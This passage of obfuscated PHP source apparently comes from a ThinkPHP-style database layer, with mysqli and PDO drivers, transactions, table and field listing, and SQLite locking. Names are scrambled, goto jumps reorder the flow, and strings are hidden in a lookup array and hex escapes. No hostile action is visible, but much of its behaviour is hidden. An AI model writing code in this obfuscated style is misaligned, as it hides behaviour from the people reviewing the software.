$_SERVER[´¬]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto aÀ¥½Õ¢ŞŒ; DÛã…Å‰…Ë: think_status($Bá‚Š¯îä•[20]); $this->queryID = $this->_linkID->query($E›æ¨­‚); if ($this->_linkID->more_results()) { while (($CÎ”Õóá‰„ = $this->_linkID->next_result()) != NULL) { $CÎ”Õóá‰„->free_result(); } } goto bî“Àñ²Ÿì; bî“Àñ²Ÿì: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } goto D«è•ˆœ; aÀ¥½Õ¢ŞŒ: $this->queryStr = $E›æ¨­‚; if ($this->queryID) { $this->free(); } think_action_status($Bá‚Š¯îä•[19], 1); goto DÛã…Å‰…Ë; D«è•ˆœ: } public function execute($BÈÄ…Œˆô­) { goto D® ï§Ûç; Cå¶‹‚ÌÙ¶: $this->queryStr = $BÈÄ…Œˆô­; if ($this->queryID) { $this->free(); } think_action_status($Déõ¬ñŸÏ[21], 1); goto c¡Ëó°òùÃ; FØæìÆ¾çß: if (!1 === $d¿˜‚Íİ²Œ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } goto bËšù‰¬ö‘; c¡Ëó°òùÃ: think_status($Déõ¬ñŸÏ[20]); $d¿˜‚Íİ²Œ = $this->_linkID->query($BÈÄ…Œˆô­); $this->debug(); goto FØæìÆ¾çß; D® ï§Ûç: $Déõ¬ñŸÏ =& $_SERVER[´¬]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto Cå¶‹‚ÌÙ¶; bËšù‰¬ö‘: } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $C®Œ›•ÒÑ× = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$C®Œ›•ÒÑ×) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $Dö¨›«Ë•é = $this->_linkID->rollback(); $this->transTimes = 0; if (!$Dö¨›«Ë•é) { $this->error(); return !1; } } return !0; } private function getAll() { $fÌˆå´ì®« = array(); if ($this->numRows > 0) { for ($fŞ¿ê‡³ç = 0; $fŞ¿ê‡³ç < $this->numRows; $fŞ¿ê‡³ç++) { $fÌˆå´ì®«[$fŞ¿ê‡³ç] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $fÌˆå´ì®«; } public function getFields($B›õßÎäƒ÷) { $c£‰„Íšéª =& $_SERVER[´¬]; $DÖ¨š¤ÙŞ = $this->query($c£‰„Íšéª[858] . $this->parseKey($B›õßÎäƒ÷)); $b¿æÌÅ”âÚ = array(); if ($DÖ¨š¤ÙŞ) { foreach ($DÖ¨š¤ÙŞ as $f½‹§İ×„ => $D—£ø·Œ…ğ) { $b¿æÌÅ”âÚ[$D—£ø·Œ…ğ[$c£‰„Íšéª[27]]] = array($c£‰„Íšéª[28] => $D—£ø·Œ…ğ[$c£‰„Íšéª[27]], $c£‰„Íšéª[29] => $D—£ø·Œ…ğ[$c£‰„Íšéª[30]], $c£‰„Íšéª[31] => (bool) ($D—£ø·Œ…ğ[$c£‰„Íšéª[32]] === $c£‰„Íšéª[33]), $c£‰„Íšéª[34] => $D—£ø·Œ…ğ[$c£‰„Íšéª[35]], $c£‰„Íšéª[36] => strtolower($D—£ø·Œ…ğ[$c£‰„Íšéª[37]]) == $c£‰„Íšéª[38], $c£‰„Íšéª[39] => strtolower($D—£ø·Œ…ğ[$c£‰„Íšéª[40]]) == $c£‰„Íšéª[41]); } } return $b¿æÌÅ”âÚ; } public function getTables($BêÂÛÛ“‹“ = '') { $Cá–Š…Å×¾ =& $_SERVER[´¬]; $dìÌÆØ©Â = !empty($BêÂÛÛ“‹“) ? $Cá–Š…Å×¾[860] . $BêÂÛÛ“‹“ . $Cá–Š…Å×¾[861] : $Cá–Š…Å×¾[862]; $fœ–¿‰¨‡ = $this->query($dìÌÆØ©Â); $A§¬Êİ¿Ù– = array(); if ($fœ–¿‰¨‡) { foreach ($fœ–¿‰¨‡ as $a¦†ßØ†‹ => $aêˆÂ½—Ó°) { $A§¬Êİ¿Ù–[$a¦†ßØ†‹] = current($aêˆÂ½—Ó°); } } return $A§¬Êİ¿Ù–; } public function replace($C„ÂİîØ†¯, $C¡‹‰È£øØ = array()) { $cŸÜ¥–ÅŠÓ =& $_SERVER[´¬]; foreach ($C„ÂİîØ†¯ as $cÜ‡Ëø˜…™ => $CÇå·­ôš) { $AÔ¦¢æé÷Û = $this->parseValue($CÇå·­ôš); if (is_scalar($AÔ¦¢æé÷Û)) { $F¼öõ„é‡Â[] = $AÔ¦¢æé÷Û; $AÒÏ„ë¾Íï[] = $this->parseKey($cÜ‡Ëø˜…™); } } $Aæ×ùŠ­ç = $cŸÜ¥–ÅŠÓ[863] . $this->parseTable($C¡‹‰È£øØ[$cŸÜ¥–ÅŠÓ[276]]) . $cŸÜ¥–ÅŠÓ[864] . implode($cŸÜ¥–ÅŠÓ[47], $AÒÏ„ë¾Íï) . $cŸÜ¥–ÅŠÓ[865] . implode($cŸÜ¥–ÅŠÓ[47], $F¼öõ„é‡Â) . $cŸÜ¥–ÅŠÓ[866]; return $this->execute($Aæ×ùŠ­ç); } public function insertAll($aº‘šè³ŸÍ, $dæ„ğÜò®Ç = array(), $EâÁ„Û—‰Î = false) { goto FÈ¡ö“ööµ; A•¸ ¢ëºö: $E¦©™¹¹Ï = array(); foreach ($aº‘šè³ŸÍ as $fËÍå¾ÅáÏ) { $eë£‘Å›Ù¬ = array(); foreach ($fËÍå¾ÅáÏ as $E Ñ°ÀŠÒ => $B×ÛÉÊõ¥è) { $B×ÛÉÊõ¥è = $this->parseValue($B×ÛÉÊõ¥è); if (is_scalar($B×ÛÉÊõ¥è)) { $eë£‘Å›Ù¬[] = $B×ÛÉÊõ¥è; } } $E¦©™¹¹Ï[] = $dŒ³„é‚®¼[257] . implode($dŒ³„é‚®¼[47], $eë£‘Å›Ù¬) . $dŒ³„é‚®¼[866]; } array_walk($FŸ­¼„†”İ, array($this, $dŒ³„é‚®¼[867])); goto C£×Çñ Æ; FÈ¡ö“ööµ: $dŒ³„é‚®¼ =& $_SERVER[´¬]; if (!is_array($aº‘šè³ŸÍ[0])) { return !1; } $FŸ­¼„†”İ = array_keys($aº‘šè³ŸÍ[0]); goto A•¸ ¢ëºö; C£×Çñ Æ: $b¡œª«õŸØ = $EâÁ„Û—‰Î ? $dŒ³„é‚®¼[868] : $dŒ³„é‚®¼[869]; $Bßƒª”ªæó = $b¡œª«õŸØ . $dŒ³„é‚®¼[870] . $this->parseTable($dæ„ğÜò®Ç[$dŒ³„é‚®¼[276]]) . $dŒ³„é‚®¼[864] . implode($dŒ³„é‚®¼[47], $FŸ­¼„†”İ) . $dŒ³„é‚®¼[871] . implode($dŒ³„é‚®¼[47], $E¦©™¹¹Ï); return $this->execute($Bßƒª”ªæó); goto aÄíŸ‚ÆéÎ; aÄíŸ‚ÆéÎ: } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $bÎÈåäÛø =& $_SERVER[´¬]; $this->error = $this->_linkID->errno . $bÎÈåäÛø[4] . $this->_linkID->error; if ($bÎÈåäÛø[33] != $this->queryStr) { $this->error .= LNG($bÎÈåäÛø[45]) . $this->queryStr; } think_trace($this->error, $bÎÈåäÛø[33], $bÎÈåäÛø[46]); return $this->error; } public function escapeString($Aƒ¢Í‘ëÀ¢) { if ($this->_linkID) { return $this->_linkID->real_escape_string($Aƒ¢Í‘ëÀ¢); } else { return addslashes($Aƒ¢Í‘ëÀ¢); } } public function parseKey(&$e¯‘ÇÁŒìí, $D™½¶†ó³š = true) { $b‚Ü›íåÄ  =& $_SERVER[´¬]; if ($D™½¶†ó³š) { $e¯‘ÇÁŒìí = $this->parseKeyCheck($e¯‘ÇÁŒìí); } if ($e¯‘ÇÁŒìí != $b‚Ü›íåÄ [182] && !preg_match($b‚Ü›íåÄ [872], $e¯‘ÇÁŒìí)) { $e¯‘ÇÁŒìí = $b‚Ü›íåÄ [381] . trim($e¯‘ÇÁŒìí, $b‚Ü›íåÄ [381]) . $b‚Ü›íåÄ [381]; } return $e¯‘ÇÁŒìí; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($Bà¾ñà£Ÿ = '') { $bê‚ò—ÄĞÃ =& $_SERVER[´¬]; if (!class_exists($bê‚ò—ÄĞÃ[874])) { think_exception(think_lang($bê‚ò—ÄĞÃ[10]) . $bê‚ò—ÄĞÃ[875]); } if (!empty($Bà¾ñà£Ÿ)) { $this->config = $Bà¾ñà£Ÿ; if (empty($this->config[$bê‚ò—ÄĞÃ[13]])) { $this->config[$bê‚ò—ÄĞÃ[13]] = array(); } } } public function connect($D¬¯…’çÁó = '', $B¾¦Û‡Á‘í = 0) { $bÍ‡±›Â‹± =& $_SERVER[´¬]; if (!isset($this->linkID[$B¾¦Û‡Á‘í])) { goto d•˜¬™©ö²; d•˜¬™©ö²: if (empty($D¬¯…’çÁó)) { $D¬¯…’çÁó = $this->config; } $BÓˆŠä‰á = !empty($D¬¯…’çÁó[$bÍ‡±›Â‹±[13]][$bÍ‡±›Â‹±[14]]) ? $D¬¯…’çÁó[$bÍ‡±›Â‹±[13]][$bÍ‡±›Â‹±[14]] : $this->pconnect; if ($BÓˆŠä‰á) { $D¬¯…’çÁó[$bÍ‡±›Â‹±[13]][PDO::ATTR_PERSISTENT] = !0; } goto Fè­–‘ˆó¬; fÈ„ÓÚÛà„: if (!$this->linkID[$B¾¦Û‡Á‘í]) { think_exception($bÍ‡±›Â‹±[884]); } try { $this->linkID[$B¾¦Û‡Á‘í]->exec($bÍ‡±›Â‹±[885] . think_config($bÍ‡±›Â‹±[852])); } catch (Exception $BÎÖØ…´´) { } $this->connected = !0; goto A„„¹Œê¦“; A„„¹Œê¦“: if (1 != think_config($bÍ‡±›Â‹±[18])) { unset($this->config); } goto EØà³ÊÜß; Fè­–‘ˆó¬: try { $this->linkID[$B¾¦Û‡Á‘í] = new PDO($D¬¯…’çÁó[$bÍ‡±›Â‹±[876]], $D¬¯…’çÁó[$bÍ‡±›Â‹±[849]], $D¬¯…’çÁó[$bÍ‡±›Â‹±[850]], $D¬¯…’çÁó[$bÍ‡±›Â‹±[13]]); } catch (PDOException $BÎÖØ…´´) { think_exception($BÎÖØ…´´->getMessage()); } $this->dbType = $this->_getDsnType($D¬¯…’çÁó[$bÍ‡±›Â‹±[876]]); if (in_array($this->dbType, array($bÍ‡±›Â‹±[877], $bÍ‡±›Â‹±[878], $bÍ‡±›Â‹±[879], $bÍ‡±›Â‹±[880]))) { think_exception($bÍ‡±›Â‹±[881] . $this->dbType . $bÍ‡±›Â‹±[882] . $this->dbType . $bÍ‡±›Â‹±[883]); } goto fÈ„ÓÚÛà„; EØà³ÊÜß: } return $this->linkID[$B¾¦Û‡Á‘í]; } public function free() { $this->PDOStatement = null; } public function query($aŞß¿Ñï¼Ş, $EÊ­£”•Šó = array()) { goto a˜Ûø®†çÚ; a”¾—î‰¼»: if (!1 === $f¶ù‡®ö•Ì) { $this->error(); return !1; } else { return $this->getAll(); } goto d±âôİê®„; CÄØå×˜¶İ: think_action_status($Fî¶˜†¦â¹[19], 1); think_status($Fî¶˜†¦â¹[20]); $this->PDOStatement = $this->_linkID->prepare($aŞß¿Ñï¼Ş); goto fÒ¹Üé; a˜Ûø®†çÚ: $Fî¶˜†¦â¹ =& $_SERVER[´¬]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto F‘â—Ö„·; F‘â—Ö„·: $this->queryStr = $aŞß¿Ñï¼Ş; if (!empty($EÊ­£”•Šó)) { $this->queryStr .= $Fî¶˜†¦â¹[886] . print_r($EÊ­£”•Šó, !0) . $Fî¶˜†¦â¹[887]; } if (!empty($this->PDOStatement)) { $this->free(); } goto CÄØå×˜¶İ; fÒ¹Üé: if (!1 === $this->PDOStatement) { think_exception($this->error()); } $f¶ù‡®ö•Ì = $this->PDOStatement->execute($EÊ­£”•Šó); $this->debug(); goto a”¾—î‰¼»; d±âôİê®„: } public function execute($D¯ê¸‰‹›®, $d³à­ùá‹ƒ = array()) { goto Fï¶Ó³ß¨; C Ôğ®ÅŸê: $this->queryStr = $D¯ê¸‰‹›®; if (!empty($d³à­ùá‹ƒ)) { $this->queryStr .= $eÎø©äŞ–Î[886] . print_r($d³à­ùá‹ƒ, !0) . $eÎø©äŞ–Î[887]; } $c³¸İÌĞÔ« = !1; goto fÙ²Èˆ™Ê; e•‚î›ÙÊ¬: $EÆƒÃ„Ì§¥ = $this->PDOStatement->execute($d³à­ùá‹ƒ); $this->debug(); if (!1 === $EÆƒÃ„Ì§¥) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($c³¸İÌĞÔ« || preg_match($eÎø©äŞ–Î[892], $D¯ê¸‰‹›®)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } goto fÈ…ó·¬±œ; fÙ²Èˆ™Ê: if ($this->dbType == $eÎø©äŞ–Î[880]) { if (preg_match($eÎø©äŞ–Î[888], $this->queryStr, $C ‘³¯«)) { $this->table = think_config($eÎø©äŞ–Î[889]) . str_ireplace(think_config($eÎø©äŞ–Î[890]), $eÎø©äŞ–Î[374], $C ‘³¯«[2]); $c³¸İÌĞÔ« = (bool) $this->query($eÎø©äŞ–Î[891] . strtoupper($this->table) . $eÎø©äŞ–Î[55]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($eÎø©äŞ–Î[21], 1); goto eÍô§­°‘ã; eÍô§­°‘ã: think_status($eÎø©äŞ–Î[20]); $this->PDOStatement = $this->_linkID->prepare($D¯ê¸‰‹›®); if (!1 === $this->PDOStatement) { think_exception($this->error()); } goto e•‚î›ÙÊ¬; Fï¶Ó³ß¨: $eÎø©äŞ–Î =& $_SERVER[´¬]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto C Ôğ®ÅŸê; fÈ…ó·¬±œ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $dĞÃŠìÑÏ = $this->_linkID->commit(); $this->transTimes = 0; if (!$dĞÃŠìÑÏ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $D£ÑºİµÃ… = $this->_linkID->rollback(); $this->transTimes = 0; if (!$D£ÑºİµÃ…) { $this->error(); return !1; } } return !0; } private function getAll() { $AğàïíÉ§ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($AğàïíÉ§); return $AğàïíÉ§; } public function getFields($aŠò¤¬ÃÊ‚) { goto e¥ß«§“Û; eíÍˆÔ£¨¡: return $FÀ‡‰¸‘´À; goto AØ‚ÒÎÔ¼; e¥ß«§“Û: $Eóº˜ßæ’¿ =& $_SERVER[´¬]; $this->initConnect(!0); if (think_config($Eóº˜ßæ’¿[893])) { $ašºê«»²× = str_replace($Eóº˜ßæ’¿[894], $aŠò¤¬ÃÊ‚, think_config($Eóº˜ßæ’¿[893])); } else { switch ($this->dbType) { case $Eóº˜ßæ’¿[877]: case $Eóº˜ßæ’¿[895]: $ašºê«»²× = "\123\x45\x4c\105\103\x54\x20\x20\x20\x63\x6f\x6c\x75\x6d\156\x5f\x6e\141\155\x65\40\x61\163\40\47\x4e\141\155\145\x27\54\x20\x20\x20\144\x61\x74\141\x5f\x74\x79\160\x65\40\141\163\40\47\x54\x79\160\x65\x27\54\40\x20\x20\x63\x6f\154\165\155\x6e\137\144\145\x66\x61\165\x6c\164\x20\141\163\x20\47\x44\x65\146\141\x75\x6c\x74\x27\x2c\40\40\x20\x69\x73\137\156\165\x6c\x6c\x61\142\x6c\x65\x20\x61\x73\x20\x27\116\165\x6c\154\x27\12\x9\11\x46\x52\x4f\x4d\x9\151\156\146\157\162\155\141\x74\151\x6f\x6e\x5f\163\143\150\145\x6d\x61\x2e\x74\141\x62\x6c\145\163\40\101\123\40\164\12\11\x9\x4a\x4f\x49\x4e\x9\x69\x6e\146\157\162\155\141\x74\151\x6f\156\x5f\163\x63\x68\145\x6d\141\x2e\143\x6f\154\165\155\x6e\163\40\x41\x53\40\143\12\x9\11\117\x4e\40\40\x74\x2e\x74\x61\142\154\145\137\143\x61\x74\x61\154\x6f\147\40\75\x20\x63\56\x74\141\x62\x6c\x65\x5f\143\x61\x74\x61\x6c\157\147\12\11\11\x41\116\x44\40\x74\56\164\141\x62\154\x65\137\x73\x63\x68\145\x6d\x61\40\75\x20\143\x2e\164\141\x62\154\x65\137\x73\143\x68\145\155\141\12\11\x9\x41\116\x44\x20\x74\56\164\141\142\x6c\145\137\x6e\x61\155\x65\40\x3d\x20\x63\56\x74\x61\x62\154\145\137\156\x61\155\145\12\x9\11\127\110\x45\x52\x45\x20\x20\40\x74\56\164\x61\142\x6c\145\x5f\x6e\x61\155\145\40\75\x20\47{$aŠò¤¬ÃÊ‚}\47"; break; case $Eóº˜ßæ’¿[896]: $ašºê«»²× = $Eóº˜ßæ’¿[897] . $aŠò¤¬ÃÊ‚ . $Eóº˜ßæ’¿[898]; break; case $Eóº˜ßæ’¿[878]: case $Eóº˜ßæ’¿[880]: $ašºê«»²× = $Eóº˜ßæ’¿[899] . $Eóº˜ßæ’¿[900] . $Eóº˜ßæ’¿[901] . strtoupper($aŠò¤¬ÃÊ‚) . $Eóº˜ßæ’¿[902] . strtoupper($aŠò¤¬ÃÊ‚) . $Eóº˜ßæ’¿[903]; break; case $Eóº˜ßæ’¿[904]: $ašºê«»²× = $Eóº˜ßæ’¿[905] . $aŠò¤¬ÃÊ‚ . $Eóº˜ßæ’¿[906]; break; case $Eóº˜ßæ’¿[879]: break; case $Eóº˜ßæ’¿[907]: default: $ašºê«»²× = $Eóº˜ßæ’¿[908] . ($this->dbType == $Eóº˜ßæ’¿[907] ? "\x60{$aŠò¤¬ÃÊ‚}\x60" : $aŠò¤¬ÃÊ‚); } } goto D—êïÓŒÜÕ; D—êïÓŒÜÕ: $e×¸Ï¹è‚ = $this->query($ašºê«»²×); $FÀ‡‰¸‘´À = array(); if ($e×¸Ï¹è‚) { foreach ($e×¸Ï¹è‚ as $D½Æ­Ã÷¦ğ => $b‹ã¬›Ş­Š) { $b‹ã¬›Ş­Š = array_change_key_case($b‹ã¬›Ş­Š); $b‹ã¬›Ş­Š[$Eóº˜ßæ’¿[28]] = isset($b‹ã¬›Ş­Š[$Eóº˜ßæ’¿[28]]) ? $b‹ã¬›Ş­Š[$Eóº˜ßæ’¿[28]] : $Eóº˜ßæ’¿[374]; $b‹ã¬›Ş­Š[$Eóº˜ßæ’¿[29]] = isset($b‹ã¬›Ş­Š[$Eóº˜ßæ’¿[29]]) ? $b‹ã¬›Ş­Š[$Eóº˜ßæ’¿[29]] : $Eóº˜ßæ’¿[374]; $Fïâ—¦‘äŒ = isset($b‹ã¬›Ş­Š[$Eóº˜ßæ’¿[270]]) ? $b‹ã¬›Ş­Š[$Eóº˜ßæ’¿[270]] : $b‹ã¬›Ş­Š[$Eóº˜ßæ’¿[28]]; $FÀ‡‰¸‘´À[$Fïâ—¦‘äŒ] = array($Eóº˜ßæ’¿[28] => $Fïâ—¦‘äŒ, $Eóº˜ßæ’¿[29] => $b‹ã¬›Ş­Š[$Eóº˜ßæ’¿[29]], $Eóº˜ßæ’¿[31] => (bool) (isset($b‹ã¬›Ş­Š[$Eóº˜ßæ’¿[103]]) && $b‹ã¬›Ş­Š[$Eóº˜ßæ’¿[103]] === $Eóº˜ßæ’¿[33] || isset($b‹ã¬›Ş­Š[$Eóº˜ßæ’¿[31]]) && $b‹ã¬›Ş­Š[$Eóº˜ßæ’¿[31]] === $Eóº˜ßæ’¿[33]), $Eóº˜ßæ’¿[34] => isset($b‹ã¬›Ş­Š[$Eóº˜ßæ’¿[34]]) ? $b‹ã¬›Ş­Š[$Eóº˜ßæ’¿[34]] : (isset($b‹ã¬›Ş­Š[$Eóº˜ßæ’¿[53]]) ? $b‹ã¬›Ş­Š[$Eóº˜ßæ’¿[53]] : $Eóº˜ßæ’¿[374]), $Eóº˜ßæ’¿[36] => isset($b‹ã¬›Ş­Š[$Eóº˜ßæ’¿[93]]) ? strtolower($b‹ã¬›Ş­Š[$Eóº˜ßæ’¿[93]]) == $Eóº˜ßæ’¿[38] : (isset($b‹ã¬›Ş­Š[$Eóº˜ßæ’¿[54]]) ? $b‹ã¬›Ş­Š[$Eóº˜ßæ’¿[54]] : !1), $Eóº˜ßæ’¿[39] => isset($b‹ã¬›Ş­Š[$Eóº˜ßæ’¿[909]]) ? strtolower($b‹ã¬›Ş­Š[$Eóº˜ßæ’¿[909]]) == $Eóº˜ßæ’¿[41] : (isset($b‹ã¬›Ş­Š[$Eóº˜ßæ’¿[93]]) ? $b‹ã¬›Ş­Š[$Eóº˜ßæ’¿[93]] : !1)); } } goto eíÍˆÔ£¨¡; AØ‚ÒÎÔ¼: } public function getTables($aéÀÀåˆÑ = '') { $céîÑêïçä =& $_SERVER[´¬]; if (think_config($céîÑêïçä[910])) { $F÷ÒÚÏ¶¥š = str_replace($céîÑêïçä[911], $aéÀÀåˆÑ, think_config($céîÑêïçä[910])); } else { switch ($this->dbType) { case $céîÑêïçä[878]: case $céîÑêïçä[880]: $F÷ÒÚÏ¶¥š = $céîÑêïçä[912]; break; case $céîÑêïçä[877]: case $céîÑêïçä[895]: $F÷ÒÚÏ¶¥š = $céîÑêïçä[913]; break; case $céîÑêïçä[904]: $F÷ÒÚÏ¶¥š = $céîÑêïçä[914]; break; case $céîÑêïçä[879]: think_exception(think_lang($céîÑêïçä[915]) . $céîÑêïçä[916]); break; case $céîÑêïçä[896]: $F÷ÒÚÏ¶¥š = $céîÑêïçä[42] . $céîÑêïçä[43] . $céîÑêïçä[44]; break; case $céîÑêïçä[907]: default: if (!empty($aéÀÀåˆÑ)) { $F÷ÒÚÏ¶¥š = $céîÑêïçä[860] . $aéÀÀåˆÑ . $céîÑêïçä[861]; } else { $F÷ÒÚÏ¶¥š = $céîÑêïçä[862]; } } } $e•ÇÓ£ôÅ = $this->query($F÷ÒÚÏ¶¥š); $Cà›Û‚·Şæ = array(); foreach ($e•ÇÓ£ôÅ as $C¦ï¡ôÈäƒ => $C‹™óÄç•) { $Cà›Û‚·Şæ[$C¦ï¡ôÈäƒ] = current($C‹™óÄç•); } return $Cà›Û‚·Şæ; } protected function parseLimit($CÂôù•§í) { $f£ÚÄÆ×„ =& $_SERVER[´¬]; $aø¡ÊÀù µ = $f£ÚÄÆ×„[33]; if (!empty($CÂôù•§í)) { switch ($this->dbType) { case $f£ÚÄÆ×„[904]: case $f£ÚÄÆ×„[896]: $CÂôù•§í = explode($f£ÚÄÆ×„[47], $CÂôù•§í); if (count($CÂôù•§í) > 1) { $aø¡ÊÀù µ .= $f£ÚÄÆ×„[48] . $CÂôù•§í[1] . $f£ÚÄÆ×„[49] . $CÂôù•§í[0] . $f£ÚÄÆ×„[50]; } else { $aø¡ÊÀù µ .= $f£ÚÄÆ×„[48] . $CÂôù•§í[0] . $f£ÚÄÆ×„[50]; } break; case $f£ÚÄÆ×„[877]: case $f£ÚÄÆ×„[895]: break; case $f£ÚÄÆ×„[879]: break; case $f£ÚÄÆ×„[878]: case $f£ÚÄÆ×„[880]: break; case $f£ÚÄÆ×„[907]: default: $aø¡ÊÀù µ .= $f£ÚÄÆ×„[48] . $CÂôù•§í . $f£ÚÄÆ×„[50]; } } return $aø¡ÊÀù µ; } public function parseKey(&$eööÜ¯«‰¦, $E¹ÔÛ„ğŠö = true) { $Fö™øä˜ =& $_SERVER[´¬]; if ($E¹ÔÛ„ğŠö) { $eööÜ¯«‰¦ = $this->parseKeyCheck($eööÜ¯«‰¦); } if ($this->dbType == $Fö™øä˜[907]) { if ($eööÜ¯«‰¦ != $Fö™øä˜[182] && !preg_match($Fö™øä˜[872], $eööÜ¯«‰¦)) { $eööÜ¯«‰¦ = $Fö™øä˜[381] . trim($eööÜ¯«‰¦, $Fö™øä˜[381]) . $Fö™øä˜[381]; } return $eööÜ¯«‰¦; } else { return parent::parseKey($eööÜ¯«‰¦, $E¹ÔÛ„ğŠö); } } public function close() { $this->_linkID = null; } public function error() { $Bù°ƒÊÙœĞ =& $_SERVER[´¬]; if ($this->PDOStatement) { $Eµê‚Ü¾Ê· = $this->PDOStatement->errorInfo(); $this->error = $Eµê‚Ü¾Ê·[1] . $Bù°ƒÊÙœĞ[4] . $Eµê‚Ü¾Ê·[2]; } else { $this->error = $Bù°ƒÊÙœĞ[33]; } if ($Bù°ƒÊÙœĞ[33] != $this->queryStr) { $this->error .= LNG($Bù°ƒÊÙœĞ[45]) . $this->queryStr; } think_trace($this->error, $Bù°ƒÊÙœĞ[33], $Bù°ƒÊÙœĞ[46]); return $this->error; } public function escapeString($a×™Šª¦½÷) { $AÁÓğ =& $_SERVER[´¬]; switch ($this->dbType) { case $AÁÓğ[904]: case $AÁÓğ[877]: case $AÁÓğ[895]: case $AÁÓğ[907]: return addslashes($a×™Šª¦½÷); case $AÁÓğ[879]: case $AÁÓğ[896]: case $AÁÓğ[878]: case $AÁÓğ[880]: return str_ireplace($AÁÓğ[55], $AÁÓğ[56], $a×™Šª¦½÷); } } protected function parseValue($AÌƒ¥ÈÖÔ) { $c¾ÄÅÖÉ­ =& $_SERVER[´¬]; if (is_string($AÌƒ¥ÈÖÔ)) { $a¤˜ÀÈœƒ = strpos($AÌƒ¥ÈÖÔ, $c¾ÄÅÖÉ­[4]) === 0 && in_array($AÌƒ¥ÈÖÔ, array_keys($this->bind)); $AÌƒ¥ÈÖÔ = $a¤˜ÀÈœƒ ? $this->escapeString($AÌƒ¥ÈÖÔ) : $c¾ÄÅÖÉ­[917] . $this->escapeString($AÌƒ¥ÈÖÔ) . $c¾ÄÅÖÉ­[917]; } elseif (isset($AÌƒ¥ÈÖÔ[0]) && is_string($AÌƒ¥ÈÖÔ[0]) && strtolower($AÌƒ¥ÈÖÔ[0]) == $c¾ÄÅÖÉ­[294]) { $AÌƒ¥ÈÖÔ = $this->escapeString($AÌƒ¥ÈÖÔ[1]); } elseif (is_array($AÌƒ¥ÈÖÔ)) { $AÌƒ¥ÈÖÔ = array_map(array($this, $c¾ÄÅÖÉ­[918]), $AÌƒ¥ÈÖÔ); } elseif (is_bool($AÌƒ¥ÈÖÔ)) { $AÌƒ¥ÈÖÔ = $AÌƒ¥ÈÖÔ ? $c¾ÄÅÖÉ­[87] : $c¾ÄÅÖÉ­[495]; } elseif (is_null($AÌƒ¥ÈÖÔ)) { $AÌƒ¥ÈÖÔ = $c¾ÄÅÖÉ­[103]; } return $AÌƒ¥ÈÖÔ; } public function getLastInsertId() { $EåŒùµ›—Ğ =& $_SERVER[´¬]; switch ($this->dbType) { case $EåŒùµ›—Ğ[904]: case $EåŒùµ›—Ğ[896]: case $EåŒùµ›—Ğ[877]: case $EåŒùµ›—Ğ[895]: case $EåŒùµ›—Ğ[879]: case $EåŒùµ›—Ğ[907]: return $this->_linkID->lastInsertId(); case $EåŒùµ›—Ğ[878]: case $EåŒùµ›—Ğ[880]: $EÔ‚÷—­à = $this->table; $F¡˜‚³ä‡ø = $this->query("\123\x45\x4c\105\x43\x54\40{$EÔ‚÷—­à}\56\x63\165\x72\x72\166\141\x6c\x20\x63\165\162\x72\166\141\154\40\x46\x52\x4f\115\x20\144\165\141\154"); return $F¡˜‚³ä‡ø ? $F¡˜‚³ä‡ø[0][$EåŒùµ›—Ğ[919]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($Aå—î¡á¢) { $EÔğ´ŸˆÊó =& $_SERVER[´¬]; if (!CacheLock::fileLock($EÔğ´ŸˆÊó[9])) { return !1; } $fÅØ©ŠÅ¡ = parent::query($Aå—î¡á¢); CacheLock::fileUnLock($EÔğ´ŸˆÊó[9]); return $fÅØ©ŠÅ¡; } public function execute($fŠˆŒƒ—¼») { $Eé‘ÏÖ’±š =& $_SERVER[´¬]; if (!CacheLock::fileLock($Eé‘ÏÖ’±š[9])) { return !1; } $FÈÌÉ‰õá = parent::execute($fŠˆŒƒ—¼»); CacheLock::fileUnLock($Eé‘ÏÖ’±š[9]); return $FÈÌÉ‰õá; } } goto FÇÔğ×„İß; B„ĞÙéï¤: define($_SERVER[´¬][239], 0); define($_SERVER[´¬][240], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\x61\x62\x6c\145", "\157\x72\144\x65\162", "\x61\154\151\141\163", "\150\141\166\151\x6e\147", "\147\x72\157\x75\x70", "\154\157\143\153", "\x64\x69\163\164\151\x6e\143\164", "\141\165\x74\x6f", "\x66\x69\154\164\145\162", "\x76\x61\154\x69\x64\x61\164\x65", "\x72\x65\163\165\x6c\x74", "\142\x69\156\144", "\x74\157\x6b\x65\156"); public function __construct($B¹Èâ÷Ô¨½ = '', $a‰àÔó‡ò÷ = '', $FÙêªÏƒ…Œ = '') { $c¬ìÌÎ•š =& $_SERVER[´¬]; $this->_initialize(); if (!empty($B¹Èâ÷Ô¨½)) { if (strpos($B¹Èâ÷Ô¨½, $c¬ìÌÎ•š[95])) { list($this->dbName, $this->name) 